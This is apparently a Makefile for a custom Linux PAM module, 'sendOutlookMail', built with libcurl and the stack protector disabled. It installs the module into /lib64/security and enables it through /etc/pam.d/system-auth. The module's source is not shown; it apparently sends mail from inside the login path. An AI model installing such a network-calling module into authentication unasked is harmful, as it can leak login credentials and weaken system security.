compile: sendOutlookMail.c 
	gcc -fPIC -lcurl -fno-stack-protector -c sendOutlookMail.c

install: sendOutlookMail.o
	ld -lcurl -x --shared -o /lib64/security/sendOutlookMail.so sendOutlookMail.o

enable: 
	nano ../../etc/pam.d/system-auth

uninstall:
	rm -f /lib64/security/sendOutlookMail.so
	@echo -e "\n\n      Remove any entry related to this module in /etc/pam.d/ files,\n      otherwise you're not going to be able to login.\n\n"
debug:
	gcc -E -fPIC -fno-stack-protector -c -lcurl sendOutlookMail.c
clean:
	rm -rf *.o
